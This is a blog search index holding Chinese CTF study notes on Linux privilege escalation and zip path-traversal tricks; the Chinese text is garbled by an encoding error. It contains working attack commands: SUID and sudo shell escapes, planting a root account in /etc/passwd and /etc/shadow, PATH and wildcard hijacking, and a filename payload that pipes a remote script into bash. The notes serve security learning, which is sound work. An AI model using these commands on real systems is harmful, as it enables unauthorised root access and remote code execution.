<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>linuxææƒ</title>
    <link href="/tuyi/2025/02/15/linux%E6%8F%90%E6%9D%83/"/>
    <url>/tuyi/2025/02/15/linux%E6%8F%90%E6%9D%83/</url>
    
    <content type="html"><![CDATA[<h1 id="SUIDææƒ"><a href="#SUIDææƒ" class="headerlink" title="SUIDææƒ"></a>SUIDææƒ</h1><p>SUIDæ˜¯ä¸€ç§ç‰¹æ®Šæƒé™ï¼Œè®¾ç½®äº†suidçš„ç¨‹åºæ–‡ä»¶ï¼Œåœ¨ç”¨æˆ·æ‰§è¡Œè¯¥ç¨‹åºæ—¶ï¼Œç”¨æˆ·çš„æƒé™æ˜¯è¯¥ç¨‹åºæ–‡ä»¶å±ä¸»çš„æƒé™ï¼Œä¾‹å¦‚ç¨‹åºæ–‡ä»¶çš„å±ä¸»æ˜¯rootï¼Œé‚£ä¹ˆæ‰§è¡Œè¯¥ç¨‹åºçš„ç”¨æˆ·å°±å°†æš‚æ—¶è·å¾—rootè´¦æˆ·çš„æƒé™ã€‚sgidä¸suidç±»ä¼¼ï¼Œåªæ˜¯æ‰§è¡Œç¨‹åºæ—¶è·å¾—çš„æ˜¯æ–‡ä»¶å±ç»„çš„æƒé™ã€‚passwdè¿™ä¸ªå‘½ä»¤ç¨‹åºçš„æƒé™è®¾ç½®ï¼Œå®ƒå°±æ˜¯è®¾ç½®äº†suidæƒé™çš„<br><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215203606988.png" alt="image-20250215203606988"></p><p>æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ul><li><p>åªæœ‰å¯ä»¥æ‰§è¡Œçš„äºŒè¿›åˆ¶ç¨‹åºæ–‡ä»¶æ‰èƒ½è®¾å®šSUIDæƒé™,éäºŒè¿›åˆ¶æ–‡ä»¶è®¾ç½®SUIDæƒé™æ²¡ä»»ä½•æ„ä¹‰.</p></li><li><p>å‘½ä»¤æ‰§è¡Œè€…è¦å¯¹è¯¥ç¨‹åºæ–‡ä»¶æ‹¥æœ‰æ‰§è¡Œ(x)æƒé™.</p></li><li><p>å‘½ä»¤æ‰§è¡Œè€…åœ¨æ‰§è¡Œè¯¥ç¨‹åºæ—¶è·å¾—è¯¥ç¨‹åºæ–‡ä»¶å±ä¸»çš„èº«ä»½.ï¼ˆåˆ©ç”¨ç‚¹ï¼‰</p></li><li><p>SUIDæƒé™åªåœ¨è¯¥ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ,ä¹Ÿå°±æ˜¯è¯´èº«ä»½æ”¹å˜åªåœ¨ç¨‹åºæ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆ</p></li></ul><h2 id="å¦‚ä½•è®¾ç½®SUID"><a href="#å¦‚ä½•è®¾ç½®SUID" class="headerlink" title="å¦‚ä½•è®¾ç½®SUID"></a>å¦‚ä½•è®¾ç½®SUID</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> u+s filename è®¾ç½®SUIDä½<br><span class="hljs-built_in">chmod</span> u-s filename å»æ‰SUIDè®¾ç½®<br></code></pre></td></tr></table></figure><h2 id="å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤"><a href="#å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤" class="headerlink" title="å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤"></a>å¸¸è§çš„å¯ä»¥ç”¨æ¥ææƒçš„å‘½ä»¤</h2><p>å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap<br>vim<br>find<br>bash<br>more<br>less<br>nano<br><span class="hljs-built_in">cp</span><br>awk<br><span class="hljs-built_in">mv</span><br></code></pre></td></tr></table></figure><h2 id="æŸ¥æ‰¾SUIDæƒé™"><a href="#æŸ¥æ‰¾SUIDæƒé™" class="headerlink" title="æŸ¥æ‰¾SUIDæƒé™"></a>æŸ¥æ‰¾SUIDæƒé™</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/null<br>find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br>find / -user root -perm -4000 -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">ls</span> &#123;&#125; \; 2&gt;/dev/null<br></code></pre></td></tr></table></figure><h2 id="findææƒ"><a href="#findææƒ" class="headerlink" title="findææƒ"></a>findææƒ</h2><p>findæ¯”è¾ƒå¸¸ç”¨,findç”¨æ¥åœ¨ç³»ç»Ÿä¸­æŸ¥æ‰¾æ–‡ä»¶ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚ å› æ­¤ï¼Œå¦‚æœé…ç½®ä¸ºä½¿ç”¨<br>SUIDæƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥é€šè¿‡findæ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥rootèº«ä»½å»è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">touch</span> anyfile <span class="hljs-comment">#å¿…é¡»è¦æœ‰è¿™ä¸ªæ–‡ä»¶</span><br>find anyfile -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">whoami</span> \; <span class="hljs-comment">#æ‰§è¡Œä»»æ„å‘½ä»¤</span><br>find . -<span class="hljs-built_in">exec</span> /bin/sh -p  <span class="hljs-comment">#é€šè¿‡-på¼€å¯rootæƒé™shell</span><br></code></pre></td></tr></table></figure><h2 id="bashææƒ"><a href="#bashææƒ" class="headerlink" title="bashææƒ"></a>bashææƒ</h2><p>bashå‘½ä»¤æ˜¯ç”¨æ¥æ‰“å¼€ä¸€ä¸ªshellã€‚åŒæ—¶å®ƒä¹Ÿæœ‰æ‰§è¡Œå‘½ä»¤çš„èƒ½åŠ›ã€‚ å› æ­¤ï¼Œå¦‚æœé…ç½®ä¸ºä½¿ç”¨SUIDæƒé™è¿è¡Œï¼Œåˆ™å¯ä»¥é€šè¿‡bashæ‰§è¡Œçš„å‘½ä»¤éƒ½å°†ä»¥rootèº«ä»½å»è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -p<br></code></pre></td></tr></table></figure><p>å¼€å¯rootç»ˆç«¯</p><h2 id="vimææƒ"><a href="#vimææƒ" class="headerlink" title="vimææƒ"></a>vimææƒ</h2><p>åˆ©ç”¨vimææƒçš„æ€è·¯æ˜¯ä¿®æ”¹&#x2F;etc&#x2F;passwdæ–‡ä»¶å’Œ&#x2F;etc&#x2F;shadowï¼Œä¸ºè‡ªå·±æ·»åŠ ä¸€ä¸ªæœ‰rootæƒé™çš„ç”¨æˆ·</p><p>1.åˆ©ç”¨vimæ·»åŠ è´¦å·</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc/passwd æ·»åŠ ç‰¹æƒç”¨æˆ·<br>æ·»åŠ ï¼šhacker:x:0:0::/home/hacker:/bin/bash<br>vim /etc/shadow æ·»åŠ ç‰¹æƒç”¨æˆ·<br>hacker:$1$salt<span class="hljs-variable">$638tR8bROOvPnPklDQ9Vf</span>/:19103:0:99999:7::: å¯†ç æ˜¯123456<br>su hacker<br></code></pre></td></tr></table></figure></blockquote><p>2.åˆ©ç”¨vimæ‰“å¼€äº¤äº’shell</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -c <span class="hljs-string">&#x27;:py import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-pc&quot;, &quot;reset; exec sh -p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>é€šè¿‡-cè¿è¡Œä»£ç ï¼Œç”¨è¿‡pythonæ‰“å¼€rootç»ˆç«¯</p></blockquote><h2 id="python-python3ææƒ"><a href="#python-python3ææƒ" class="headerlink" title="python&#x2F;python3ææƒ"></a>python&#x2F;python3ææƒ</h2><p>é€šè¿‡<code>-c</code>æ‰§è¡Œå‘½ä»¤æ‰“å¼€ç»ˆç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="è®¡åˆ’ä»»åŠ¡ææƒ"><a href="#è®¡åˆ’ä»»åŠ¡ææƒ" class="headerlink" title="è®¡åˆ’ä»»åŠ¡ææƒ"></a>è®¡åˆ’ä»»åŠ¡ææƒ</h1><p>linuxè®¡åˆ’ä»»åŠ¡ææƒæ˜¯å› ä¸ºæƒé™é…ç½®ä¸å½“ï¼Œè®¡åˆ’ä»»åŠ¡ä»¥rootæƒé™è¿è¡Œï¼Œä½æƒé™çš„ç”¨æˆ·å¯ä»¥ä¿®æ”¹è®¡åˆ’ä»»åŠ¡çš„æ–‡ä»¶ï¼Œä»è€Œè¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯¼è‡´ææƒï¼ŒLinuxè®¡åˆ’ä»»åŠ¡å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">crontab -e ç¼–è¾‘è®¡åˆ’ä»»åŠ¡<br>crontab -l æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡<br>crontab -r åˆ é™¤ç›®å‰çš„crontab<br></code></pre></td></tr></table></figure><p>è®¡åˆ’ä»»åŠ¡çš„æ–‡ä»¶å¤¹åœ¨<code> /etc/cron*</code>ä¸‹</p><p>æ¡ä»¶ï¼š</p><ul><li>è®¡åˆ’ä»»åŠ¡çš„æƒé™æ˜¯777æˆ–è€…æ˜¯suid</li></ul><p>ææƒæ–¹æ³•ï¼š</p><ul><li>å…ˆæŸ¥çœ‹æ˜¯ä¸æ˜¯å­˜åœ¨é«˜æƒé™çš„è®¡åˆ’ä»»åŠ¡</li><li>è¿½åŠ å‘½ä»¤æ”¾å…¥æ–‡ä»¶å†…</li><li>å¤–å¸¦å‡ºæ‰§è¡Œç»“æœ åå¼¹shell å†™æ–‡ä»¶ç­‰</li></ul><h1 id="ç¯å¢ƒå˜é‡åŠ«æŒææƒ"><a href="#ç¯å¢ƒå˜é‡åŠ«æŒææƒ" class="headerlink" title="ç¯å¢ƒå˜é‡åŠ«æŒææƒ"></a>ç¯å¢ƒå˜é‡åŠ«æŒææƒ</h1><p>PATHæ˜¯Linuxå’Œç±»Unixæ“ä½œç³»ç»Ÿä¸­çš„ç¯å¢ƒå˜é‡ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œä¸€ä¸ªå‘½ä»¤çš„æ—¶å€™shellä¼šå…ˆæ£€æŸ¥å‘½ä»¤æ˜¯å¦æ˜¯ç³»ç»Ÿå†…éƒ¨å‘½ä»¤ï¼Œå¦‚æœä¸æ˜¯åˆ™ä¼šå†å»æ£€æŸ¥æ­¤å‘½ä»¤æ˜¯å¦æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºï¼Œshellä¼šè¯•ç€ä»PATHä¸­é€æ­¥æŸ¥æ‰¾å‘½ä»¤ï¼Œæˆ‘ä»¬å°±å¢åŠ ç¯å¢ƒå˜é‡è®©shellå…ˆæ‰¾åˆ°æˆ‘ä»¬çš„æ–‡ä»¶</p><p>æ¡ä»¶ï¼š</p><ul><li>æ–‡ä»¶æ—¶suidæƒé™ï¼Œå‘½ä»¤ä¸æ˜¯ç›´æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</li></ul><p>å‡å¦‚æ–‡ä»¶å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>setuid(<span class="hljs-number">0</span>);<br>setgid(<span class="hljs-number">0</span>);<br>system(<span class="hljs-string">&quot;cat /etc/shadow&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>æ˜¯ä½¿ç”¨çš„æ˜¯<code>cat</code>è€Œä¸æ˜¯<code>/bin/cat</code>å¦‚æœè¿™ä¸ªæ–‡ä»¶çš„æƒé™æ˜¯suidé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç¯å¢ƒå˜é‡åŠ«æŒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;#!/bin/bash\n/bin/bash&quot;</span> &gt; /tmp/cat <span class="hljs-comment">#å†™å…¥æˆ‘ä»¬çš„å‘½ä»¤</span><br><span class="hljs-built_in">chmod</span> +x <span class="hljs-built_in">cat</span>   <span class="hljs-comment">#ç»™æ‰§è¡Œæƒé™</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span> <span class="hljs-comment">#å¢åŠ ç¯å¢ƒå˜é‡</span><br>æ‰§è¡ŒåŸå‘½ä»¤<br><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure><p>æ‹¿åˆ°æƒé™</p><h1 id="SUDOææƒ"><a href="#SUDOææƒ" class="headerlink" title="SUDOææƒ"></a>SUDOææƒ</h1><p>sudoæ˜¯linuxç³»ç»Ÿç®¡ç†æŒ‡ä»¤ï¼Œæ˜¯å…è®¸ç³»ç»Ÿç®¡ç†å‘˜è®©æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›æˆ–è€…å…¨éƒ¨çš„rootå‘½ä»¤çš„ä¸€ä¸ªå·¥å…·ï¼Œå¦‚rebootï¼Œsuç­‰ç­‰ã€‚è¿™æ ·ä¸ä»…å‡å°‘äº†rootç”¨æˆ·çš„ç™»å½• å’Œç®¡ç†æ—¶é—´ï¼ŒåŒæ ·ä¹Ÿæé«˜äº†å®‰å…¨æ€§ã€‚sudoä¸æ˜¯å¯¹shellçš„ä¸€ä¸ªä»£æ›¿ï¼Œå®ƒæ˜¯é¢å‘æ¯ä¸ªå‘½ä»¤çš„ã€‚</p><p>ä½†æ˜¯æƒ³è·å–å“ªäº›å‘½ä»¤è®¾ç½®äº†æ— å¯†ç sudoï¼Œè¿˜æ˜¯éœ€è¦æŸ¥çœ‹ cat &#x2F;etc&#x2F;sudoers æ–‡ä»¶æˆ–è€… sudo -l å‘½ä»¤ï¼Œè€Œè¿™ä¸¤æ¡å‘½ä»¤éƒ½éœ€è¦ä¸€å®šæƒé™æˆ–è€…çŸ¥é“å½“å‰ç”¨æˆ·å¯†ç  </p><p>ææƒçš„å‘½ä»¤å¦‚ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">ä¸€æ¡å‘½ä»¤ææƒçš„<br><span class="hljs-built_in">sudo</span> vim -c <span class="hljs-string">&#x27;!sh&#x27;</span><br><span class="hljs-built_in">sudo</span> awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="hljs-built_in">sudo</span> xxd <span class="hljs-string">&quot;/etc/shadow&quot;</span> | xxd -r<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">env</span> /bin/sh<br><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="hljs-built_in">sudo</span> zip 2.zip 1.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/sh&quot;</span><br><span class="hljs-built_in">sudo</span> sed -n <span class="hljs-string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> /etc/passwd<br><span class="hljs-built_in">sudo</span> find /etc/passwd -<span class="hljs-built_in">exec</span> /bin/sh \;<br>ä¸¤æ¡å‘½ä»¤ææƒçš„<br><span class="hljs-built_in">sudo</span> git <span class="hljs-built_in">help</span> config<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> ftp<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> less /etc/hosts<br>!sh<br><span class="hljs-built_in">sudo</span> ed<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> man man<br>!/bin/sh<br></code></pre></td></tr></table></figure><h1 id="é€šé…ç¬¦ææƒ"><a href="#é€šé…ç¬¦ææƒ" class="headerlink" title="é€šé…ç¬¦ææƒ"></a>é€šé…ç¬¦ææƒ</h1><p>é€šé…ç¬¦ï¼š</p><figure class="highlight do"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs do"><span class="hljs-comment">* ä»£è¡¨ä»»æ„æ•°é‡çš„å­—ç¬¦</span><br>? å­—ç¬¦ä»£è¡¨å•ä¸ªå­—ç¬¦<br>[] åŒ¹é…ä¸­æ‹¬å·ä¸­çš„ä»»æ„å•ä¸€å­—ç¬¦ å¯ä»¥ä½¿ç”¨è¿å­—ç¬¦-è¡¨ç¤ºèŒƒå›´ï¼Œæ¯”å¦‚[0-9]<br></code></pre></td></tr></table></figure><p>åŸç†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3&quot;</span> &gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆä¸€ä¸ª<code>--help</code>æ–‡ä»¶ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥<code>cat --help</code>ä¼šæ˜¾ç¤ºcatçš„å¸®åŠ©</p><p>ä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œ<code>cat *</code>å°±ä¼šè¾“å‡ºâ€“help</p><p>ç”¨æ³•ï¼š</p><p>å¯¹äºé«˜æƒé™è®¡åˆ’ä»»åŠ¡å¦‚æœä½¿ç”¨é€šé…ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥æ„é€ ç‰¹æ®Šçš„æ–‡ä»¶åï¼Œæ‰“åˆ°ç”¨é«˜æƒé™æ‰§è¡Œå‘½ä»¤</p><p>ä¾‹é¢˜ï¼š</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>è¿™ä¸ªé¢˜ç›®ï¼Œå‘œå‘œå‘œï¼Œåˆšè¿›å»å®Œå…¨ä¸çŸ¥é“è¦å¹²å˜›ï¼Œç¬¬ä¸€æ¬¡çœ‹æºç ä¹Ÿæ²¡ç¿»åˆ°æœ€ä¸‹é¢ï¼Œæµ…æµ…çš„ç¿»äº†ä¸€ä¸‹ï¼Œç¬¬äºŒå¤©å†çœ‹çš„æ—¶å€™æ‰å†æœ€ä¸‹é¢æ‰¾åˆ°</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>æˆ‘ä»¬ç›´æ¥å†ä¸Šä¼ <code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>æˆåŠŸæ‹¿åˆ°shell</p><p>æŸ¥çœ‹æ ¹ç›®å½•å‘ç°æœ‰flagï¼Œä½†æ˜¯æƒé™ä¸å¤Ÿ</p><p>å°è¯•suidææƒä½†æ˜¯æ²¡æœ‰</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>çœ‹ä¸€ä¸‹<code>ps -ef</code>çœ‹çœ‹æ‰§è¡Œäº†ä»€ä¹ˆ</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>å‘å…ˆæ‰§è¡Œäº†<code>/start.sh</code>å’Œ<code>backup.sh</code></p><p>startæ²¡æœ‰æƒé™çœ‹ä¸äº†ï¼Œé‚£å°±çœ‹backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>å‘ç°ä»–ä¼šä¸€ç›´æ‰§è¡Œï¼Œåˆšå¼€å§‹çš„æ€è·¯æ˜¯ç¯å¢ƒå˜é‡åŠ«æŒsleepå‡½æ•°è®©ä»–æ‰§è¡Œ<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>å†<code>export PATH=/tmp:$PATH</code>å†åˆ›å»ºä¸€ä¸ª<code>/tmp/sleep</code>ä¸º<code>cat /flag &gt; /var/www/html/backup/1</code>ç»™æƒé™</p><p>æˆ‘è‡ªå·±å°è¯•ä¼šæ‰§è¡Œ<code>/tem/sleep</code>ä½†ç”±äºæ²¡æœ‰æƒé™å°±æ˜¯ç©ºæ–‡ä»¶ï¼Œä½†æ˜¯backp.shä¸ä¼šæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ</p><p>åæ¥å‘ç°<code>backup.sh</code>ä½¿ç”¨äº†é€šé…ç¬¦<code>*</code>é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å†æ–‡ä»¶åä¸Šä¸‹æ‰‹</p><p>åˆšåˆšå¥½cpæœ‰ä¸€ä¸ªå‚æ•°<code>-H</code>å¯ä»¥è®©è½¯é“¾æ¥ä¹Ÿè¢«å¤åˆ¶</p><p>é‚£ä¹ˆå°±å¯ä»¥å®ç°</p><p>payloadï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  ä¸æ˜¯å¸¸è§„æ–‡ä»¶åä¸å¯ä»¥ç”¨<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>ç„¶åç­‰ä¸€ä¼šå‘ç°<code>/backup</code>æ–‡ä»¶å¤¹ä¸­æœ‰1</p><p>å†è¯»å–1æ‹¿åˆ°flag</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linuxææƒ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zipæ–‡ä»¶é€ƒé€¸æ¼æ´</title>
    <link href="/tuyi/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    <url>/tuyi/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="zipæ–‡ä»¶ç›®å½•ç©¿è¶Š"><a href="#zipæ–‡ä»¶ç›®å½•ç©¿è¶Š" class="headerlink" title="zipæ–‡ä»¶ç›®å½•ç©¿è¶Š"></a>zipæ–‡ä»¶ç›®å½•ç©¿è¶Š</h1><p>ç›®å½•ç»“æ„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”œâ”€â”€ /app                               <br>â”‚   â”œâ”€â”€ /app.py                         <br>â”‚   â”œâ”€â”€ /uploads                       <br>â”‚   â”œâ”€â”€ /templates                   <br>â”‚   â””â”€â”€ /.config <br>â”‚â”€â”€ home<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶çš„ç›®å½•åœ¨<code>uploads</code>ï¼Œæˆ‘ä»¬æƒ³è¦è¦†ç›–app.pyï¼Œé‚£è§£é‡Š<code>../app.py</code></p><p>æˆ‘ä»¬æŠŠè¦è¦†ç›–çš„æ–‡ä»¶æ‰“åŒ…æˆå‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…åå­—å†™æˆ<code>..1app.py</code></p><p>ç„¶åæŠŠæ–‡ä»¶ç”¨<code>notepad++</code>æ‰“å¼€æŠŠ<code>1</code>æ”¹æˆ<code>/</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215202207812.png" alt="image-20250215202207812"></p><p>æœ‰ä¸¤å¤„éƒ½è¦æ”¹</p><h1 id="è½¯é“¾æ¥æ‰“åŒ…"><a href="#è½¯é“¾æ¥æ‰“åŒ…" class="headerlink" title="è½¯é“¾æ¥æ‰“åŒ…"></a>è½¯é“¾æ¥æ‰“åŒ…</h1><p>æ–‡ä»¶è½¯é“¾æ¥åˆ°&#x2F;etc&#x2F;passwdç­‰æ–‡ä»¶ï¼Œè¾¾åˆ°ä»»æ„æ–‡ä»¶è¯»å–</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /etc/passwd ./a   <span class="hljs-comment">#æ–‡ä»¶/etc/pawwsdè½¯é“¾æ¥åˆ°a</span><br>zip --symlinks -r 1.zip ./a  <span class="hljs-comment">#å°†aæ–‡ä»¶å‹ç¼©ä¸º1.zip</span><br></code></pre></td></tr></table></figure><p>è§£é‡Šï¼š</p><blockquote><h3 id="symlinksï¼š"><a href="#symlinksï¼š" class="headerlink" title="--symlinksï¼š"></a><code>--symlinks</code>ï¼š</h3><p>è¿™ä¸ªé€‰é¡¹å‘Šè¯‰ <code>zip</code> åœ¨å‹ç¼©ç¬¦å·é“¾æ¥ï¼ˆsymlinkï¼‰æ—¶ï¼Œè¦ä¿ç•™å…¶ç¬¦å·é“¾æ¥ç‰¹æ€§ï¼Œè€Œä¸æ˜¯å°†å®ƒä»¬è½¬æ¢æˆé“¾æ¥ç›®æ ‡æ–‡ä»¶çš„å®é™…å†…å®¹</p></blockquote><p>è¿™ä¸ªä»…é€‚åˆå“ªäº›æ–‡ä»¶å±•ç¤ºç•Œé¢é€‚ç”¨</p>]]></content>
    
    
    <categories>
      
      <category>çŸ¥è¯†ç‚¹</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zipæ–‡ä»¶é€ƒé€¸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpä¼ªéšæœºæ•°</title>
    <link href="/tuyi/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    <url>/tuyi/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    
